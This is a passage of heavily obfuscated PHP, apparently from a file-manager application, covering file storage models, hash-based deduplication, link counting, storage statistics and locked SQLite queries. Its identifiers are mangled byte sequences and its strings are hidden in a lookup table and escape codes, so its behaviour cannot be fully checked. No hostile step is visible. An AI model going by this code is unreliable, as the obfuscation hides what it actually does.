$ßÜÉÆ[7], $ßÜÉÆ[1958], array($ßÜÉÆ[2218], $ßÜÉÆ[540])); $µÉĞÑïŸ = $§Ö³ ¿î . $ßÜÉÆ[53] . $ÖãÄâ¾¥; return $this->order($µÉĞÑïŸ); } private function _listAppendParent(&$õÆòáá¥) { $ßˆ‹İ˜Ö =& $_SERVER[¹Éµ„ºå]; $…¶æà—õ = array_unique(array_to_keyvalue($õÆòáá¥, $ßˆ‹İ˜Ö[12], $ßˆ‹İ˜Ö[2201])); $…¶æà—õ = array_remove_value($…¶æà—õ, $ßˆ‹İ˜Ö[228]); if (!$…¶æà—õ) { return; } $Ş‚ĞÑ = $this->where(array($ßˆ‹İ˜Ö[2202] => array($ßˆ‹İ˜Ö[7], $…¶æà—õ)))->select(); $Ş‚ĞÑ = array_to_keyvalue($Ş‚ĞÑ, $ßˆ‹İ˜Ö[2209]); foreach ($õÆòáá¥ as &$²ƒ—¸Š¨) { if (isset($Ş‚ĞÑ[$²ƒ—¸Š¨[$ßˆ‹İ˜Ö[2201]]])) { $²ƒ—¸Š¨[$ßˆ‹İ˜Ö[2219]] = $Ş‚ĞÑ[$²ƒ—¸Š¨[$ßˆ‹İ˜Ö[2201]]]; } } unset($²ƒ—¸Š¨); } private function _listAppendUser(&$øÑğÃˆİ) { $“’õÆ› =& $_SERVER[¹Éµ„ºå]; $¼—Ò³Õ¢ = array_unique(array_to_keyvalue($øÑğÃˆİ, $“’õÆ›[12], $“’õÆ›[1582])); $¼—Ò³Õ¢ = array_remove_value($¼—Ò³Õ¢, $“’õÆ›[228]); if (count($¼—Ò³Õ¢) == 0) { return; } foreach ($øÑğÃˆİ as $õä›‡é®) { if (isset($õä›‡é®[$“’õÆ›[2219]])) { $¼—Ò³Õ¢[] = $õä›‡é®[$“’õÆ›[2219]][$“’õÆ›[1582]]; } } $’Ô¨˜é† = Model($“’õÆ›[617])->userListInfo($¼—Ò³Õ¢); foreach ($øÑğÃˆİ as &$õä›‡é®) { $õä›‡é®[$“’õÆ›[684]] = $’Ô¨˜é†[$õä›‡é®[$“’õÆ›[1582]]]; if (isset($õä›‡é®[$“’õÆ›[2219]])) { $õä›‡é®[$“’õÆ›[2219]][$“’õÆ›[684]] = $’Ô¨˜é†[$õä›‡é®[$“’õÆ›[2219]][$“’õÆ›[1582]]]; } } unset($õä›‡é®); } private function _listAppendMeta(&$êè—»÷†) { $¬‚Íú” =& $_SERVER[¹Éµ„ºå]; $·óÏŞµ… = array_unique(array_to_keyvalue($êè—»÷†, $¬‚Íú”[12], $¬‚Íú”[2209])); $·óÏŞµ… = array_remove_value($·óÏŞµ…, $¬‚Íú”[228]); if (!$·óÏŞµ…) { return; } foreach ($êè—»÷† as $áÈà›ì) { if (isset($áÈà›ì[$¬‚Íú”[2219]])) { $·óÏŞµ…[] = $áÈà›ì[$¬‚Íú”[2219]][$¬‚Íú”[2209]]; } } $ïŞŒÛ‡Ç = $this->metaList($·óÏŞµ…); if (!$ïŞŒÛ‡Ç) { return !1; } foreach ($êè—»÷† as &$áÈà›ì) { $áÈà›ì[$¬‚Íú”[555]] = $ïŞŒÛ‡Ç[$áÈà›ì[$¬‚Íú”[2209]]]; if (isset($áÈà›ì[$¬‚Íú”[2219]])) { $áÈà›ì[$¬‚Íú”[2219]][$¬‚Íú”[555]] = $ïŞŒÛ‡Ç[$áÈà›ì[$¬‚Íú”[2219]][$¬‚Íú”[2209]]]; } } unset($áÈà›ì); } private function metaList($ ™¨š€) { $¿¸•ÚĞæ =& $_SERVER[¹Éµ„ºå]; if (!$ ™¨š€) { return array(); } $ÕÕ”²‹ö = array($¿¸•ÚĞæ[2209] => array($¿¸•ÚĞæ[7], $ ™¨š€)); $ıÅ®Ú¼ = Model($¿¸•ÚĞæ[2220])->where($ÕÕ”²‹ö)->select(); $ıÅ®Ú¼ = array_to_keyvalue_group($ıÅ®Ú¼, $¿¸•ÚĞæ[2209]); foreach ($ıÅ®Ú¼ as $Ãë¢ƒÍÅ => $Â¬¥İî“) { $‹‘ì¿œû = array(); foreach ($Â¬¥İî“ as $ïœ»úÊÇ) { $‹‘ì¿œû[$ïœ»úÊÇ[$¿¸•ÚĞæ[95]]] = $ïœ»úÊÇ[$¿¸•ÚĞæ[451]]; } $ıÅ®Ú¼[$Ãë¢ƒÍÅ] = $‹‘ì¿œû; } return $ıÅ®Ú¼ ? $ıÅ®Ú¼ : array(); } public function removeTarget($ÇùåÇšó, $šøüÓßÆ) { $éú©¼Œ¾ =& $_SERVER[¹Éµ„ºå]; if (!$šøüÓßÆ) { return !0; } $šøüÓßÆ = is_array($šøüÓßÆ) ? $šøüÓßÆ : array($šøüÓßÆ); $Ä»»äî = array($éú©¼Œ¾[188] => $ÇùåÇšó, $éú©¼Œ¾[589] => array($éú©¼Œ¾[7], $šøüÓßÆ)); $Í¨·é¹ï = $this->field($éú©¼Œ¾[2209])->where($Ä»»äî)->select(); $ˆ´ÏÏ÷¿ = array_to_keyvalue($Í¨·é¹ï, $éú©¼Œ¾[12], $éú©¼Œ¾[2209]); return $this->removeArray($ˆ´ÏÏ÷¿); } public function removeArray($Ğ²³”í£) { $ÆÀÙÃäË =& $_SERVER[¹Éµ„ºå]; if (!$Ğ²³”í£) { return !0; } $Ğ²³”í£ = is_array($Ğ²³”í£) ? $Ğ²³”í£ : array($Ğ²³”í£); $Ã£¡É‚‰ = array($ÆÀÙÃäË[2209] => array($ÆÀÙÃäË[7], $Ğ²³”í£)); Model($ÆÀÙÃäË[2212])->where($Ã£¡É‚‰)->delete(); Model($ÆÀÙÃäË[2221])->where($Ã£¡É‚‰)->delete(); return $this->where($Ã£¡É‚‰)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\x6c\x65\x5f\x63\157\156\x74\x65\156\x74\x73"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\x54\151\x6d\145", "\x74\151\155\145", "\151\x6e\163\x65\x72\164", "\x66\x75\x6e\143\x74\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\x6c\x65"; protected $tableMeta = array("\164\x61\x62\154\x65\116\141\x6d\x65" => "\x69\157\x5f\146\151\x6c\145\x5f\x6d\145\164\x61", "\155\145\164\x61\x46\x69\x65\154\x64" => "\146\151\x6c\x65\x49\104"); public function fileInfo($ú§¦¦Û) { $û¾»ê÷« =& $_SERVER[¹Éµ„ºå]; static $ªâñÏ® = array(); if (!isset($ªâñÏ®[$ú§¦¦Û])) { $Ó˜À’â… = $û¾»ê÷«[2222]; $µ×îÀ€¥ = Model($û¾»ê÷«[560])->field($Ó˜À’â…)->where(array($û¾»ê÷«[558] => $ú§¦¦Û))->find(); $ªâñÏ®[$ú§¦¦Û] = $µ×îÀ€¥; } return $ªâñÏ®[$ú§¦¦Û]; } public function addFileByContent($œí‹Í”Š = '', $˜­÷Ğºı, $Ì­’ºº = '') { $›”Ç‚ãÎ =& $_SERVER[¹Éµ„ºå]; $Çâ·ºÄß = TEMP_PATH . $›”Ç‚ãÎ[2223]; if (!is_dir($Çâ·ºÄß)) { mk_dir($Çâ·ºÄß); } $Ş‹Û‘»Ô = $Çâ·ºÄß . $›”Ç‚ãÎ[2224] . rand_string(16); $¥÷ë·Ü = file_put_contents($Ş‹Û‘»Ô, $œí‹Í”Š); if ($¥÷ë·Ü === !1 || strlen($œí‹Í”Š) != $¥÷ë·Ü) { return !1; } $’–²¤³ß = $this->addFile($Ş‹Û‘»Ô, $˜­÷Ğºı, $Ì­’ºº, !0); if (file_exists($Ş‹Û‘»Ô)) { @unlink($Ş‹Û‘»Ô); } return $’–²¤³ß; } public function createFileName($è‚¸—œè, $¢úœ¾, $§ö¿Ëó™ = false, $ÏÈ¥ĞÀÄ = false) { $æÌ«ì‡Ò =& $_SERVER[¹Éµ„ºå]; $•Ò Ëï‘ = IO::init($æÌ«ì‡Ò[8]); $ŸÔÊ½¿Ö = $this->_makeFilePath($è‚¸—œè, $¢úœ¾, $•Ò Ëï‘, $§ö¿Ëó™, $ÏÈ¥ĞÀÄ); $ÒøÁó‡ì = $•Ò Ëï‘->pathFather($ŸÔÊ½¿Ö); static $ş©½¬õ‚ = false; $íáÁÀ™ı = $æÌ«ì‡Ò[2225] . md5($ÒøÁó‡ì); if (!$ş©½¬õ‚ && !Cache::get($íáÁÀ™ı)) { $ş©½¬õ‚ = !0; $°‚£±•Ã = IO::mkdir($ÒøÁó‡ì); if (!IO::exist($°‚£±•Ã . $æÌ«ì‡Ò[890])) { IO::mkfile($°‚£±•Ã . $æÌ«ì‡Ò[890]); } Cache::set($íáÁÀ™ı, 1, 3600 * 2); } return $ŸÔÊ½¿Ö; } public function _makeFilePath($âËÀú±Í, $ˆ»­™Ğ³, $Î„ù¢Ï, $ş¦¤à© = false, $ïÙò±øò = false) { $ÉÔ®ßÁÎ =& $_SERVER[¹Éµ„ºå]; $şÑªëÜÀ = Model($ÉÔ®ßÁÎ[864])->get($ÉÔ®ßÁÎ[2226]); $ÍÉÌß° = $ÉÔ®ßÁÎ[1416] . $ˆ»­™Ğ³[$ÉÔ®ßÁÎ[487]] . $ÉÔ®ßÁÎ[499] . date($ÉÔ®ßÁÎ[2227]); $Šƒ³Ú­¾ = $ÍÉÌß° . rand_string(5) . short_id(100); $âËÀú±Í = str_replace($ÉÔ®ßÁÎ[8], $ÉÔ®ßÁÎ[11], KodIO::clear($âËÀú±Í)); $Ìó×Ë©È = $Î„ù¢Ï->ext($âËÀú±Í); if (!$âËÀú±Í) { $şÑªëÜÀ = $ÉÔ®ßÁÎ[935]; } switch ($şÑªëÜÀ) { case $ÉÔ®ßÁÎ[2228]: if ($Ìó×Ë©È) { $Šƒ³Ú­¾ = $Šƒ³Ú­¾ . $ÉÔ®ßÁÎ[10] . $Ìó×Ë©È; } if ($Ìó×Ë©È == $ÉÔ®ßÁÎ[2162]) { $Šƒ³Ú­¾ .= $ÉÔ®ßÁÎ[1385]; } break; case $ÉÔ®ßÁÎ[2229]: $¬¨ñãƒ¶ = Model($ÉÔ®ßÁÎ[864])->get($ÉÔ®ßÁÎ[865]); $•ƒ³ò…Ù = substr(md5($ÉÔ®ßÁÎ[866] . $¬¨ñãƒ¶ . date($ÉÔ®ßÁÎ[840])), 0, 8); $ÍÉÌß° = $ÉÔ®ßÁÎ[1416] . $ˆ»­™Ğ³[$ÉÔ®ßÁÎ[487]] . $ÉÔ®ßÁÎ[499] . date($ÉÔ®ßÁÎ[2230]) . $•ƒ³ò…Ù . $ÉÔ®ßÁÎ[8]; if ($Ìó×Ë©È == $ÉÔ®ßÁÎ[2162]) { $âËÀú±Í .= $ÉÔ®ßÁÎ[1385]; } $‘™’¢¸¸ = $ÉÔ®ßÁÎ[2231] . $ÍÉÌß° . $âËÀú±Í; CacheLock::lock($‘™’¢¸¸); $Šƒ³Ú­¾ = $ÍÉÌß° . $âËÀú±Í; if (IO::exist($ÍÉÌß° . $âËÀú±Í)) { $ÉİèÃ­Å = substr($âËÀú±Í, 0, strlen($âËÀú±Í) - strlen($Ìó×Ë©È)); $‹“ÇÑà = $ïÙò±øò ? substr($ïÙò±øò, 0, 5) : ($ş¦¤à© ? substr($ş¦¤à©, 0, 5) : rand_string(5)); $‹“ÇÑà .= rand_string(3); $Šƒ³Ú­¾ = $ÍÉÌß° . $ÉİèÃ­Å . $‹“ÇÑà; if ($Ìó×Ë©È) { $Šƒ³Ú­¾ = $Šƒ³Ú­¾ . $ÉÔ®ßÁÎ[10] . $Ìó×Ë©È; } } if (IO::isOsDriver($Šƒ³Ú­¾) && !IO::isUploadServer($Šƒ³Ú­¾)) { if (IO::exist($Šƒ³Ú­¾)) { CacheLock::unlock($‘™’¢¸¸); return $Šƒ³Ú­¾; } $…åıœ¾Û = IO::setContent($Šƒ³Ú­¾, $ÉÔ®ßÁÎ[12]); if (!$…åıœ¾Û) { show_json($ÉÔ®ßÁÎ[2232], !1); } } CacheLock::unlock($‘™’¢¸¸); break; case $ÉÔ®ßÁÎ[935]: break; default: break; } return $Šƒ³Ú­¾; } public function addFileByRemote($Éôê¶…ã, $û–‹ó¡Ÿ, $âæ‡ÓÍ = array()) { $ãêûô¶ó =& $_SERVER[¹Éµ„ºå]; if (!IO::isFile($Éôê¶…ã)) { return !1; } $‰‘Ö’Šƒ = $âæ‡ÓÍ[$ãêûô¶ó[563]] ? $âæ‡ÓÍ[$ãêûô¶ó[563]] : $ãêûô¶ó[12]; $®Ö¶õÊÅ = IO::hashMd5($Éôê¶…ã, $‰‘Ö’Šƒ); $¸·¨‰ĞÉ = KodIO::parse($Éôê¶…ã); $•ó§Âê— = array($ãêûô¶ó[640] => IO::size($Éôê¶…ã), $ãêûô¶ó[2233] => 1, $ãêûô¶ó[509] => $û–‹ó¡Ÿ, $ãêûô¶ó[906] => $¸·¨‰ĞÉ[$ãêûô¶ó[487]], $ãêûô¶ó[510] => $Éôê¶…ã, $ãêûô¶ó[2234] => $âæ‡ÓÍ[$ãêûô¶ó[694]] ? $âæ‡ÓÍ[$ãêûô¶ó[694]] : IO::hashSimple($Éôê¶…ã), $ãêûô¶ó[2235] => $®Ö¶õÊÅ ? $®Ö¶õÊÅ : $‰‘Ö’Šƒ); if ($ù¶˜ğµ = $this->addFileCheckExist($•ó§Âê—[$ãêûô¶ó[694]], $•ó§Âê—[$ãêûô¶ó[563]], $•ó§Âê—[$ãêûô¶ó[79]])) { return $ù¶˜ğµ; } return $this->addFileData($•ó§Âê—); } private function addFileData($×Áä…ÆÕ) { $íº“øù÷ =& $_SERVER[¹Éµ„ºå]; if (!$×Áä…ÆÕ) { return !1; } if (!IO::isFile($×Áä…ÆÕ[$íº“øù÷[87]])) { return !1; } $×Áä…ÆÕ[$íº“øù÷[79]] = intval($×Áä…ÆÕ[$íº“øù÷[79]]); if (!$×Áä…ÆÕ[$íº“øù÷[79]] && strlen($×Áä…ÆÕ[$íº“øù÷[694]]) > 32) { $×Áä…ÆÕ[$íº“øù÷[79]] = intval(substr($×Áä…ÆÕ[$íº“øù÷[694]], 32)); } $’€ûôÃ = $this->add($×Áä…ÆÕ); return $this->find($’€ûôÃ); } public function addFile($İœõÂæ­, $Ÿ¤±æ±±, $à¤Øš²”, $Îå½ØÃ³ = false) { $ß©•´Ÿ¸ =& $_SERVER[¹Éµ„ºå]; $¯ç‡Ö×ã = IO::hashSimple($İœõÂæ­); $„÷¤¿ = IO::size($İœõÂæ­); $­˜ûİßß = $„÷¤¿ <= 1024 * 1024 * 10 ? IO::hashMd5($İœõÂæ­) : $ß©•´Ÿ¸[12]; $•ú†µãŞ = $ß©•´Ÿ¸[2236] . $¯ç‡Ö×ã; CacheLock::lock($•ú†µãŞ); if ($­˜ûİßß && $¯ç‡Ö×ã) { $†¡ö›¾Æ = $this->addFileCheckExist($¯ç‡Ö×ã, $­˜ûİßß, $„÷¤¿); if ($†¡ö›¾Æ) { CacheLock::unlock($•ú†µãŞ); return $†¡ö›¾Æ; } } $÷¨¢±ûô = $this->addFileMake($İœõÂæ­, $Ÿ¤±æ±±, $„÷¤¿, $¯ç‡Ö×ã, $­˜ûİßß, $à¤Øš²”, $Îå½ØÃ³); $—æŒõ°ò = $this->addFileData($÷¨¢±ûô); if (!$—æŒõ°ò) { return !1; } CacheLock::unlock($•ú†µãŞ); if (!$­˜ûİßß && $—æŒõ°ò) { $this->fileMd5Check($—æŒõ°ò); } return $—æŒõ°ò; } public function fileMd5Check($Å¯°ĞÔß) { $Á“Ä‘òØ =& $_SERVER[¹Éµ„ºå]; $£½óÕ = array($Å¯°ĞÔß[$Á“Ä‘òØ[557]], $Å¯°ĞÔß[$Á“Ä‘òØ[87]]); $ç¹¹ˆé = $Á“Ä‘òØ[2237] . $Å¯°ĞÔß[$Á“Ä‘òØ[87]]; $Æ˜†’Øç = $Á“Ä‘òØ[2238] . $Å¯°ĞÔß[$Á“Ä‘òØ[557]]; TaskQueue::add($Á“Ä‘òØ[2239], $£½óÕ, $ç¹¹ˆé, $Æ˜†’Øç); } public function fileMd5Set($ïĞ¨¿„—, $÷¸ÕìÌ) { $ìÆâ™ú =& $_SERVER[¹Éµ„ºå]; $İ“ø•İ¿ = $this->find($ïĞ¨¿„—); if (!$İ“ø•İ¿ || $İ“ø•İ¿[$ìÆâ™ú[563]]) { return; } $›È¥¶”î = IO::hashMd5($÷¸ÕìÌ); if (!$›È¥¶”î) { return $ìÆâ™ú[12]; } $this->where(array($ìÆâ™ú[557] => $ïĞ¨¿„—))->save(array($ìÆâ™ú[563] => $›È¥¶”î)); } public function addFileMake($±ÅéÍ‹å, $ª„Ìó¤”, $“ùƒé©ù, $Œ›óªÙÚ, $˜—µİ¬Â, $ÎğØíÓÉ, $»º‘‰•ø) { $ ê¦ßÈ» =& $_SERVER[¹Éµ„ºå]; $ò‚ì÷¤“ = $this->createFileName($ÎğØíÓÉ, $ª„Ìó¤”, $Œ›óªÙÚ, $˜—µİ¬Â); $·˜Ş–« = get_path_father($ò‚ì÷¤“); $Ûõ·È¢ğ = get_path_this($ò‚ì÷¤“); if ($»º‘‰•ø) { $ŒÏîÓÚ› = IO::move($±ÅéÍ‹å, $·˜Ş–«, !1, $Ûõ·È¢ğ); } else { $ŒÏîÓÚ› = IO::copy($±ÅéÍ‹å, $·˜Ş–«, !1, $Ûõ·È¢ğ); } if (!$ŒÏîÓÚ›) { return !1; } $…ôşÍÜÎ = IO::init($ŒÏîÓÚ›); $…ôşÍÜÎ->cacheMethod($ ê¦ßÈ»[179], $…ôşÍÜÎ->path, $ ê¦ßÈ»[176]); if (IO::size($ŒÏîÓÚ›) != $“ùƒé©ù) { return !1; } $‚‹„¾²ú = array($ ê¦ßÈ»[640] => $“ùƒé©ù, $ ê¦ßÈ»[2233] => 1, $ ê¦ßÈ»[509] => $ÎğØíÓÉ, $ ê¦ßÈ»[906] => $ª„Ìó¤”[$ ê¦ßÈ»[487]], $ ê¦ßÈ»[510] => $ò‚ì÷¤“, $ ê¦ßÈ»[2234] => $Œ›óªÙÚ, $ ê¦ßÈ»[2235] => $˜—µİ¬Â); return $‚‹„¾²ú; } public function addFileCheckExist($ëüÂŠº‰, $½Ø¬æ¡ß, $§™ßÙ°‡) { $ÅÈË±¦ =& $_SERVER[¹Éµ„ºå]; $¯µš·ŸÆ = $this->findByHash($ëüÂŠº‰, $½Ø¬æ¡ß); if (!$¯µš·ŸÆ) { return !1; } $·ç¨¥“ = array($ÅÈË±¦[2233] => intval($¯µš·ŸÆ[$ÅÈË±¦[2240]]) + 1, $ÅÈË±¦[640] => $§™ßÙ°‡); $this->where(array($ÅÈË±¦[558] => $¯µš·ŸÆ[$ÅÈË±¦[557]]))->save($·ç¨¥“); return $¯µš·ŸÆ; } public function remove($Ó§¿å–¥) { $this->linkCountChange($Ó§¿å–¥, !1); $this->clearEmpty(); return !0; } public function linkAdd($Èô–¾ıñ) { $this->linkCountChange($Èô–¾ıñ, !0); } public function linkCountChange($Æ€¿æ…•, $°áššèû) { $¡Êè´®ı =& $_SERVER[¹Éµ„ºå]; if (!$Æ€¿æ…•) { return; } if (!is_array($Æ€¿æ…•)) { $Æ€¿æ…• = array($Æ€¿æ…•); } $º¹˜³‰ = array(); foreach ($Æ€¿æ…• as $ÊªÅÏ†—) { $ïŒœâ±­ = $ÊªÅÏ†— . $¡Êè´®ı[12]; if (!$º¹˜³‰[$ïŒœâ±­]) { $º¹˜³‰[$ïŒœâ±­] = 0; } $º¹˜³‰[$ïŒœâ±­]++; } $£½®ˆ¡‘ = array(); foreach ($º¹˜³‰ as $ÊªÅÏ†— => $ÃŞ…È½¾) { $ïŒœâ±­ = $ÃŞ…È½¾ . $¡Êè´®ı[12]; if (!$£½®ˆ¡‘[$ïŒœâ±­]) { $£½®ˆ¡‘[$ïŒœâ±­] = array(); } $£½®ˆ¡‘[$ïŒœâ±­][] = $ÊªÅÏ†—; } foreach ($£½®ˆ¡‘ as $ÃŞ…È½¾ => $ìï‹Î–—) { if (!$ìï‹Î–—) { continue; } $ÃŞ…È½¾ = $°áššèû ? $ÃŞ…È½¾ : -intval($ÃŞ…È½¾); $â±—åË… = array($¡Êè´®ı[557] => array($¡Êè´®ı[7], $ìï‹Î–—)); if ($ÃŞ…È½¾ < 0) { $â±—åË…[$¡Êè´®ı[2240]] = array($¡Êè´®ı[1172], abs($ÃŞ…È½¾)); } $this->where($â±—åË…)->setAdd($¡Êè´®ı[2240], $ÃŞ…È½¾); } } public function findByHash($×˜ÜĞˆ, $‰ª¥ÄÏ = false) { $­Û½ŞÑİ =& $_SERVER[¹Éµ„ºå]; if (!$×˜ÜĞˆ && !$‰ª¥ÄÏ) { return !1; } $É´½´´â = array($­Û½ŞÑİ[2234] => $×˜ÜĞˆ); if ($‰ª¥ÄÏ) { $É´½´´â = array($­Û½ŞÑİ[2235] => $‰ª¥ÄÏ); } return $this->order($­Û½ŞÑİ[2241])->where($É´½´´â)->find(); } public function clearEmpty($ªáÙÔÄ¦ = 1) { $—ÓÛÉéğ =& $_SERVER[¹Éµ„ºå]; $äÑŒÌÕÓ = time() - 3600 * 24 * $ªáÙÔÄ¦; $¿öÍ–œâ = $—ÓÛÉéğ[2242] . $äÑŒÌÕÓ; $®©™ŸÒá = $this->where($¿öÍ–œâ)->select(); if (!$®©™ŸÒá) { return; } $íâŞœ‘ = new Task($—ÓÛÉéğ[2243], $—ÓÛÉéğ[12], count($®©™ŸÒá)); foreach ($®©™ŸÒá as $œáçâà©) { $íâŞœ‘->update(1); $this->resetFile($œáçâà©); } $íâŞœ‘->end(); } public function resetFile($Îµ²á’) { $ÅÌ™¿‹ =& $_SERVER[¹Éµ„ºå]; $Ñ½¬åÇ¥ = array($ÅÌ™¿‹[558] => $Îµ²á’[$ÅÌ™¿‹[557]]); $ôùÄË†“ = Model($ÅÌ™¿‹[1523])->where($Ñ½¬åÇ¥)->count(); $ß‰íòÃ» = Model($ÅÌ™¿‹[2244])->where($Ñ½¬åÇ¥)->count(); $¸ØŞ† § = intval($ôùÄË†“) + intval($ß‰íòÃ»); if ($¸ØŞ† § == 0) { Model($ÅÌ™¿‹[2245])->delete($Îµ²á’[$ÅÌ™¿‹[557]]); $this->where($Ñ½¬åÇ¥)->delete(); $this->metaSet($Îµ²á’[$ÅÌ™¿‹[557]], null, null); if (!IO::isFile($Îµ²á’[$ÅÌ™¿‹[87]])) { write_log(array($ÅÌ™¿‹[2246], ACTION, $Îµ²á’), $ÅÌ™¿‹[1360]); return !1; } IO::remove($Îµ²á’[$ÅÌ™¿‹[87]]); write_log(ACTION . $ÅÌ™¿‹[977] . KodUser::id() . $ÅÌ™¿‹[2247] . $Îµ²á’[$ÅÌ™¿‹[557]] . $ÅÌ™¿‹[2033] . $Îµ²á’[$ÅÌ™¿‹[79]] . $ÅÌ™¿‹[199] . $Îµ²á’[$ÅÌ™¿‹[87]], $ÅÌ™¿‹[2246]); return; } if ($Îµ²á’[$ÅÌ™¿‹[2240]] != $¸ØŞ† §) { $this->where($Ñ½¬åÇ¥)->save(array($ÅÌ™¿‹[2233] => $¸ØŞ† §)); } } public function storageInfo($Òñ’ı°„ = false) { $‹É¡÷Ê† =& $_SERVER[¹Éµ„ºå]; $Ô¤íàó­ = $this->count() + 0.0; $şß÷àÓ› = 0; $ê×Ç‹Ú = 1; $¯ôîù÷Ò = 0; $ÑîÈÖ÷“ = 5000; for ($ğ¿Òı—ş = 0; $ğ¿Òı—ş < $Ô¤íàó­; $ğ¿Òı—ş = $ğ¿Òı—ş + $ÑîÈÖ÷“) { $û°¹ÌŸ• = $this->limit($ğ¿Òı—ş, $ÑîÈÖ÷“)->select(); foreach ($û°¹ÌŸ• as $áĞÛÁÏÔ) { $ê×Ç‹Ú += $áĞÛÁÏÔ[$‹É¡÷Ê†[79]] * $áĞÛÁÏÔ[$‹É¡÷Ê†[2240]]; $şß÷àÓ› += $áĞÛÁÏÔ[$‹É¡÷Ê†[79]] * ($áĞÛÁÏÔ[$‹É¡÷Ê†[2240]] - 1); $¯ôîù÷Ò += $áĞÛÁÏÔ[$‹É¡÷Ê†[2240]]; } } $ú¡‹Æõş = array($‹É¡÷Ê†[2248] => $ê×Ç‹Ú, $‹É¡÷Ê†[2249] => $şß÷àÓ›, $‹É¡÷Ê†[2250] => $şß÷àÓ› / $ê×Ç‹Ú, $‹É¡÷Ê†[83] => $Ô¤íàó­, $‹É¡÷Ê†[2251] => $¯ôîù÷Ò); return $ú¡‹Æõş; } } goto CÌ¬É¶¨•; A«ŠŒæŒ†: class DbSqlite extends DbSqliteBase { public function query($¶óßÇœ) { $ÂÚİ²¦ =& $_SERVER[¹Éµ„ºå]; if (!CacheLock::fileLock($ÂÚİ²¦[13])) { return !1; } $å¹¶¸ = parent::query($¶óßÇœ); CacheLock::fileUnLock($ÂÚİ²¦[13]); return $å¹¶¸; } public function execute($¬œë€Áæ) { $ñ“íª¼Û =& $_SERVER[¹Éµ„ºå]; if (!CacheLock::fileLock($ñ“íª¼Û[13])) { return !1; } $’íƒ©è = parent::execute($¬œë€Áæ); CacheLock::fileUnLock($ñ“íª¼Û[13]); return $’íƒ©è; } } class DbSqlite3 extends DbSqlite3Base { public function query($“ãÅ‹µò) { $°ÈƒÚ…  =& $_SERVER[¹Éµ„ºå]; if (!CacheLock::fileLock($°ÈƒÚ… [13])) { return !1; } $¸©úç¹ = parent::query($“ãÅ‹µò); CacheLock::fileUnLock($°ÈƒÚ… [13]); return $¸©úç¹; } public function execute($çŸÉ¡™ã) { $÷¶Îøê =& $_SERVER[¹Éµ„ºå]; if (!CacheLock::fileLock($÷¶Îøê[13])) { return !1; } $ôãÜ’¨™ = parent::execute($çŸÉ¡™ã); CacheLock::fileUnLock($÷¶Îøê[13]); return $ôãÜ’¨™; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\156\145\x71" => "\74\x3e", "\x67\164" => "\76", "\x65\147\x74" => "\76\75", "\154\x74" => "\74", "\x65\154\164" => "\74\x3d", "\156\157\164\154\151\153\x65" => "\116\x4f\x54\40\x4c\x49\113\x45", "\154\151\x6b\x65" => "\114\x49\113\x45", "\151\x6e" => "\111\116", "\156\x6f\x74\x69\x6e" => "\116\117\x54\x20\111\116", "\x6e\x6f\x74\x20\151\156" => "\x4e\117\x54\x20\111\116", "\142\145\164\x77\145\x65\156" => "\102\105\124\x57\105\x45\116", "\156\157\164\142\x65\164\x77\x65\x65\156" => "\116\x4f\124\x20\x42\x45\124\127\x45\x45\x4e", "\156\x6f\164\40\x62\x65\164\x77\x65\x65\156" => "\116\x4f\x54\40\102\105\x54\x57\x45\x45\116"); protected $selectSql = "\123\x45\x4c\x45\103\x54\x25\104\111\x53\x54\111\116\103\124\45\x20\45\x46\x49\105\114\x44\45\x20\x46\x52\117\115\x20\x25\124\101\102\x4c\x45\45\45\x4a\117\x49\x4e\x25\x25\127\110\105\122\x45\45\x25\x47\122\117\125\120\45\45\x48\101\x56\111\116\x47\45\x25\117\x52\x44\x45\122\45\45\x4c\x49\x4d\111\x54\45\x20\x25\125\x4e\x49\117\116\x25\x25\x43\x4f\x4d\x4d\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $Í§ºõ¼Œ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¹Éµ„ºå][1117], $Í§ºõ¼Œ); } public function factory($“Ÿä¾¹™ = '') { $–æ”ş¾  =& $_SERVER[¹Éµ„ºå]; $“Ÿä¾¹™ = $this->parseConfig($“Ÿä¾¹™); if (empty($“Ÿä¾¹™[$–æ”ş¾ [1118]])) { think_exception(think_lang($–æ”ş¾ [1119])); } $this->dbType = ucwords(strtolower($“Ÿä¾¹™[$–æ”ş¾ [1118]])); $šß¨–ƒ³ = $–æ”ş¾ [1120] . $this->dbType; if (class_exists($šß¨–ƒ³)) { $ÄıÒÙü = new $šß¨–ƒ³($“Ÿä¾¹™); if ($–æ”ş¾ [1121] != strtolower($“Ÿä¾¹™[$–æ”ş¾ [1118]])) { $ÄıÒÙü->dbType = strtoupper($this->dbType); } else { $ÄıÒÙü->dbType = $this->_getDsnType($“Ÿä¾¹™[$–æ”ş¾ [1073]]); } } else { think_exception(think_lang($–æ”ş¾ [1122]) . $–æ”ş¾ [1123] . $šß¨–ƒ³); } return $ÄıÒÙü; } public function __call($æÎÓƒŒš, $İü¥µ½) { if (method_exists($this, $æÎÓƒŒš)) { return call_user_func_array(array($this, $æÎÓƒŒš), $İü¥µ½); } } protected function _getDsnType($Âù×Ö•¡) { $Ÿ«¿¾‹Ò = explode($_SERVER[¹Éµ„ºå][4], $Âù×Ö•¡); $”­ÇÀ = strtoupper(trim($Ÿ«¿¾‹Ò[0])); return $”­ÇÀ; } private function parseConfig($€ª€÷á¡ = '') { $·©æÛÀØ =& $_SERVER[¹Éµ„ºå]; if (!empty($€ª€÷á¡) && is_string($€ª€÷á¡)) { $€ª€÷á¡ = $this->parseDSN($€ª€÷á¡); } elseif (is_array($€ª€÷á¡)) { $€ª€÷á¡ = array_change_key_case($€ª€÷á¡); $€ª€÷á¡ = array($·©æÛÀØ[1118] => $€ª€÷á¡[$·©æÛÀØ[1124]], $·©æÛÀØ[1042] => $€ª€÷á¡[$·©æÛÀØ[1125]], $·©æÛÀØ[1043] => $€ª€÷á¡[$·©æÛÀØ[1126]], $·©æÛÀØ[1040] => $€ª€÷á¡[$·©æÛÀØ[1127]], 